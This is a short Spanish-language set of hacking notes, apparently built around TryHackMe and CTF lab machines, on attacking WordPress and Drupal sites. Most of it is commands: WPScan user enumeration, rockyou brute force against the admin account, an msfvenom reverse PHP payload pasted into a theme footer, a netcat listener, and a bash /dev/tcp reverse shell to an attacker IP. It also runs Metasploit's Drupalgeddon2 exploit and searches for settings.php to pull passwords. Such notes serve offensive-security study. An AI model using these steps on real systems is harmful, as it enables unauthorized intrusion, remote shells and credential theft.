---
icon: '6'
---

# Hacking Entornos CMS

## Hacking en Entornos WordPress

{% embed url="https://tryhackme.com/room/internal" %}

Cuando nos encontremos que la página se ve algo mal debemos apuntar la **IP de la máquina víctima** al dominio de **WordPress** en el archivo `/etc/hosts`.

Hay que encontrar el panel de **Login** es decir con el archivo `wp-login.php`.  Usamos la herramienta **WPscan** que nos permite realizar una auditoría de este CMS y poder enumerar tanto plugins vulnerables como usuarios existentes.

```bash
wpscan --url http://<IP máquina víctima>/blog --enumerate u,vp
```

Al obtener el usuario **admin** hacemos fuerza bruta para obtener la contraseña.

```
wpscan --url http://<IP máquina víctima>/blog --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

Ir al apartado **Appearance** y a **Theme Footer** y pegamos el payload. Pegamos el contenido del payload generado por **msfvenom**.

```
msfvenom -p /php/reverse_php LHOST=<OP máquina atacante> LPORT=443 -f raw > pwned.php
```

Y nos ponemos en escucha.

```bash
nc -nlvp 443
```

Ganamos acceso pero nos tenemos que mandar otra nueva conexión porque sino la perdemos.

```
nc -nlvp 4444 #nos ponemos en escucha
bash -c "sh -i >& /dev/tcp/192.168.1.50/4444 0>&1"
```

## Hacking en Entornos Drupal – PARTE 1

{% embed url="https://ctf.comunidadhackingetico.es/challenges" %}

**Drupal** es un CMS muy utilizado a día de hoy, tratándose de una alternativa a WordPress, por lo que también existen técnicas de explotación y vulnerabilidades en este tipo de CMS. Tenemos que ver que versión de **Drupal** tenemos.

```bash
msfconsole
search drupal 7 #druppalgeddon2
use 1
show options
set RHOSTS http://<IP máquina víctima>/drupal-7.57/
run
```

En meterpreter.

```bash
shell
bash -i
```

## Hacking en Entornos Drupal – PARTE 2

{% embed url="https://mega.nz/file/qEVWUKqR#3CheB213YMSaj-VUXSu1LOj2hlI7AwD-lQUbrtR_9W0" %}

Para ver la versión.

```bash
whatweb http://IP/
```

Explotar la vulnerabilidad.

```bash
msfconsole
search drupal 8
use exploit/unix/webapp/drupal_drupalgeddon2
show options
set RHOSTS <IP máquina víctima>
exploit
```

En meterpreter.

```bash
shell 
bash -i
find / -name settings.php 2>/dev/null
# Hacer un cat del archivo para ver si hay contraseñas.
```

> **Nota**: Tener en cuenta el archivo settings.php
